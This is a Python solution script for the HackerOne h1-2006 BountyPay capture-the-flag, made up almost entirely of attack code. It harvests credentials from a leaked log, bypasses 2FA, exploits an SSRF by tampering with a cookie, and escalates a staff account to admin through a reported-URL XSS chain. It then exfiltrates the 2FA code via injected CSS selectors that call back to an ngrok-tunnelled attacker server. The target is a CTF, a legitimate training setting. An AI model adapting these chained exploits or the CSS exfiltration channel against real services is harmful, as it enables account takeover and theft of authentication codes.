# python3 h1-2006
# github.com/xyele
# 
# dependencies
# - ngrok (for getting http(s) server without port forwarding)
# - termcolor
# - terminaltables

import os,requests,json,base64,re,urllib.parse,subprocess,time
from terminaltables import AsciiTable as new_table
from termcolor import colored
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread

print(""" /$$         /$$         /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$ 
| $$       /$$$$        /$$__  $$ /$$$_  $$ /$$$_  $$ /$$__  $$
| $$$$$$$ |_  $$       |__/  \ $$| $$$$\ $$| $$$$\ $$| $$  \__/
| $$__  $$  | $$ /$$$$$$ /$$$$$$/| $$ $$ $$| $$ $$ $$| $$$$$$$ 
| $$  \ $$  | $$|______//$$____/ | $$\ $$$$| $$\ $$$$| $$__  $$
| $$  | $$  | $$       | $$      | $$ \ $$$| $$ \ $$$| $$  \ $$
| $$  | $$ /$$$$$$     | $$$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/
|__/  |__/|______/     |________/ \______/  \______/  \______/ 
""")

class static_server(BaseHTTPRequestHandler):
	def do_GET(self):
		self.send_response(200)
		if self.path.endswith(".css"):
			self.send_header('Content-type', 'text/css')
		else:
			self.send_header('Content-type', 'text/html')
		self.end_headers()
		if self.path == '/evil.css':
			self.wfile.write(full_string.encode("utf-8"))
		if self.path.startswith("/hit?code_"):
			full = self.path.replace("/hit?code_","").split("&")
			code_list[int(full[0])-1] = full[1]

	def log_message(self, format, *args):
		return
def run_server(server_class=HTTPServer, handler_class=static_server, port=1337):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    log("[*] Started HTTP server on port {}".format(port))
    httpd.serve_forever()

def log(input):
	print(colored(str(input),"blue"))
def successful(input):
	print(colored(input,"green"))
def unsuccessful(input):
	print(colored(input,"red"))
def base64decode(input):
	return base64.b64decode(input).decode("utf-8")
def base64encode(input):
	return base64.b64encode(input.encode("utf-8")).decode("utf-8")

xtoken = "8e9998ee3137ca9ade8f372739f062c1" # put your x-token what you found at apk
log("[*] Started the process!")

# get the log file
bp_web_trace_log = requests.get("https://app.bountypay.h1ctf.com/bp_web_trace.log").text.split("\n")[:-1]
credentials = [["Domain","Username","Password"]]
for line in bp_web_trace_log:
	timestamp,encoded_data = line.split(":")
	decoded_data = base64decode(encoded_data)
	json_data = json.loads(decoded_data)
	if ("PARAMS" in json_data) and ("POST" in json_data["PARAMS"]) and (("username") in json_data["PARAMS"]["POST"]):
		username = json_data["PARAMS"]["POST"]["username"]
		password = json_data["PARAMS"]["POST"]["password"]
		((["app.bountypay.h1ctf.com",username,password] in credentials) == False) and credentials.append(["app.bountypay.h1ctf.com",username,password])
successful("[+] Got credentials from bp_web_trace.log")

# get logged in with 2fa bypass
session_cookie = ""
log("[*] Trying to log-in to app.bountypay.h1ctf.com with the credentials")
for c in credentials[1:]:
	username,password = c[1].strip(),c[2].strip()
	login = requests.post("https://app.bountypay.h1ctf.com/",data="username={}&password={}&challenge=e10adc3949ba59abbe56e057f20f883e&challenge_answer=123456".format(username,password),allow_redirects=False,headers={"Content-Type": "application/x-www-form-urlencoded"})
	if ("Invalid challenge response" in login.text) or ("Invalid username / password combination" in login.text):
		unsuccessful("[-] Error")
		exit()
	session_cookie = re.findall("token=(.*); expires=",login.headers["Set-Cookie"])[0]
	successful("[+] Successfully logged in with 2FA bypass")

# exploit the ssrf
log("[*] Exploiting the SSRF vulnerability download file from internal network")
decoded_json_cookie = json.loads(base64decode(session_cookie))
decoded_json_cookie["account_id"] = """../../redirect?url=https%3A%2F%2Fsoftware.bountypay.h1ctf.com%2Fuploads%2F#"""
encoded_cookie = base64encode(json.dumps(decoded_json_cookie))
exploit = requests.get("https://app.bountypay.h1ctf.com/statements?month=05&year=2020",headers={"Cookie":"token={}".format(encoded_cookie)})
successful("[+] Got directory listining at software.bountypay.h1ctf.com/uploads")
files = re.findall('<a href="/uploads/(.*)">',json.loads(exploit.text)["data"])
for f in files:
	log("[*] https://software.bountypay.h1ctf.com/uploads/{}".format(f))
unsuccessful("[-] Skipping the apk part")

# list the staff
log("[*] Trying to get staff list using API")
req = requests.get("https://api.bountypay.h1ctf.com/api/staff",headers={"X-Token":xtoken})
if (req.status_code != 200):
	unsuccessful("[-] Error")
	exit()
staff_table = [["Name","Staff ID"]]
for s in json.loads(req.text):
	staff_table.append([s["name"],s["staff_id"]])
successful("[+] Got the staff list")

# create staff member account
log("[*] Trying to get credentials of staff")
for s in staff_table[1:]:
	req = requests.post("https://api.bountypay.h1ctf.com/api/staff",headers={"X-Token":xtoken,"Content-Type":"application/x-www-form-urlencoded"},data="staff_id={}".format(s[1]))
	unsuccessful("[-] It is not possible to create staff member account for {}".format(s[1]))
log("[*] Found new staff by twitter (https://twitter.com/SandraA76708114/status/1258693001964068864)")
log("[*] Trying to create staff member account of Sandra")
staff_table.append(["Sandra Allison","STF:8FJ3KFISL3"])
req = requests.post("https://api.bountypay.h1ctf.com/api/staff",headers={"X-Token":xtoken,"Content-Type":"application/x-www-form-urlencoded"},data="staff_id={}".format("STF:8FJ3KFISL3"))
if (("Staff Member Account Created" in req.text) == False):
	unsuccessful("[-] Error")
	exit()
json_data = json.loads(req.text)
successful("[+] Created the account with staff id of Sandra!")
credentials.append(["staff.bountypay.h1ctf.com",json_data["username"],json_data["password"]])

# get logged in and exploit the xss
log("[*] Trying to privilege escalation")
req = requests.post("https://staff.bountypay.h1ctf.com/?template=login",allow_redirects=False,data="username={}&password={}".format("sandra.allison","s%253D8qB8zEpMnc*xsz7Yp5"),headers={"Content-Type":"application/x-www-form-urlencoded"})
if (((req.status_code == 302) and ("Set-Cookie" in req.headers)) == False):
	unsuccessful("[-] Error")
	exit()
session_cookie = re.findall("token=(.*); expires=",req.headers["Set-Cookie"])[0]
successful("[+] Logged in to the staff panel!")
log("[*] Changing avatar for exploitation")
req = requests.post("https://staff.bountypay.h1ctf.com/?template=home",allow_redirects=False,data="profile_name=sandra&profile_avatar=avatar3+tab3+upgradeToAdmin",headers={"Content-Type":"application/x-www-form-urlencoded","Cookie":"token={}".format(session_cookie)})
session_cookie = re.findall("token=(.*); expires=",req.headers["Set-Cookie"])[0]
log("[*] Sending report to admin to trigger priv esc.")
req = requests.get("https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjM=",allow_redirects=False,headers={"Cookie":"token={}".format(session_cookie)})
session_cookie = re.findall("token=(.*); expires=",req.headers["Set-Cookie"])[0]
req = requests.get("https://staff.bountypay.h1ctf.com/?template=home",allow_redirects=False,headers={"Cookie":"token={}".format(session_cookie)})
if (('<a href="#">Admin</a>' in req.text) == False):
	unsuccessful("[-] Error")
	exit()
account_of_marten = ["app.bountypay.h1ctf.com","marten.mickos",re.findall('<td>marten.mickos</td>\n                                <td class="text-center">✅</td>\n                                <td>(.*)</td>',req.text)[0]]
credentials.append(account_of_marten)
successful("[+] Escalted to admin and got customer credentials of marten")

# logging into app as marten
log("[*] Trying to login to the app (with 2FA bypass) with Marten's credentials...")
username = account_of_marten[1]
password = urllib.parse.quote(account_of_marten[2])
login = requests.post("https://app.bountypay.h1ctf.com/",data="username={}&password={}&challenge=e10adc3949ba59abbe56e057f20f883e&challenge_answer=123456".format(username,password),allow_redirects=False,headers={"Content-Type": "application/x-www-form-urlencoded"})
if ("Invalid challenge response" in login.text) or ("Invalid username / password combination" in login.text):
	unsuccessful("[-] Error")
	exit()
successful("[*] Logged in successfully :O")
session_cookie = re.findall("token=(.*); expires=",login.headers["Set-Cookie"])[0]

# get transactions & paid them using by 2fa bypass via css data exfil
req = requests.get("https://app.bountypay.h1ctf.com/statements?month=05&year=2020",headers={"Cookie":"token={}".format(session_cookie)})
transactions = json.loads(json.loads(req.text)["data"])["transactions"]
for t in transactions:
	log("[*] Found transaction {} {}".format(t["id"],t["hash"]))
	log("[*] Bypassing 2FA via css data exfiltration")
	full_string = ""
	code_list = ["null","null","null","null","null","null","null"]
	template = """input[name="code_{}"][value$="{}"] {{ background-image: url("{}/hit?code_{}&{}"); }}"""
	char_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^*()+-[]{}"
	http_thread = Thread(target = run_server, args = ())
	http_thread.daemon = True
	http_thread.start()
	ngrok_server = subprocess.Popen(["ngrok", 'http', str(1337)], stdout=subprocess.PIPE) # i've used ngrok because the target webserver needs https
	time.sleep(3)
	ngrok_url = [i["public_url"] for i in json.loads(requests.get("http://localhost:4040/api/tunnels").text)["tunnels"] if i["public_url"].startswith("https://")][0]
	for code_number in range(1,8):
		for char in char_list:
			string = template.format(str(code_number),char,ngrok_url,str(code_number),char)
			if full_string == "":
				full_string = string
			else:
				full_string += "\n{}".format(string)
	log("[*] Sending evil.css to the target")
	req = requests.post("https://app.bountypay.h1ctf.com/pay/{}/{}".format(t["id"],t["hash"]),data="app_style={}/evil.css".format(ngrok_url),headers={"Content-Type": "application/x-www-form-urlencoded","Cookie":"token={}".format(session_cookie)})
	challange = re.findall('<input type="hidden" name="challenge" value="(.*)">',req.text)[0]
	challange_timeout = re.findall('<input type="hidden" name="challenge_timeout" value="(.*)">',req.text)[0]
	time.sleep(10) # waiting to get all requests
	if ("null" in code_list):
		unsuccessful("[-] Unexpected error has occured, please run the script again.")
		exit()
	successful("[+] Got the 2FA code! ({})".format("".join(code_list)))
	post_data = "challenge_timeout={}&challenge={}&challenge_answer={}".format(challange_timeout,challange,"".join(code_list))
	req = requests.post("https://app.bountypay.h1ctf.com/pay/{}/{}".format(t["id"],t["hash"]),data=post_data,headers={"Content-Type": "application/x-www-form-urlencoded","Cookie":"token={}".format(session_cookie)})
	if "^FLAG^" in req.text:
		successful("[+] ^FLAG^{}$FLAG$".format(re.findall("\^FLAG\^(.*)\$FLAG\$",req.text)[0]))
	print("\nCredentials:")
	print(new_table(credentials).table)
	print("\nStaff List:")
	print(new_table(staff_table).table)
	ngrok_server.terminate()
	exit()
	"""print(code_list)
	if "null" in code_list:
		unsuccessful("[-] Unexpected error has occured, please run the script again.")
		exit()
	successful("[+] Got the first 6 character of 2FA code, trying to find last one.")
	
	for c in char_list:
		first_six = "".join(code_list)
		post_data = "challenge_timeout={}&challenge={}&challenge_answer={}{}".format(challange_timeout,challange,first_six,c)
		req = requests.post("https://app.bountypay.h1ctf.com/pay/{}/{}".format(t["id"],t["hash"]),data=post_data,headers={"Content-Type": "application/x-www-form-urlencoded","Cookie":"token={}".format(session_cookie)})
		if "^FLAG^" in req.text:
			successful("[+] Found flag! ^FLAG^{}$FLAG$".format(re.findall("\^FLAG\^(.*)\$FLAG\$",req.text)[0]))

	unsuccessful("[-] Unexpected error has occured, please run the script again.")
	exit()"""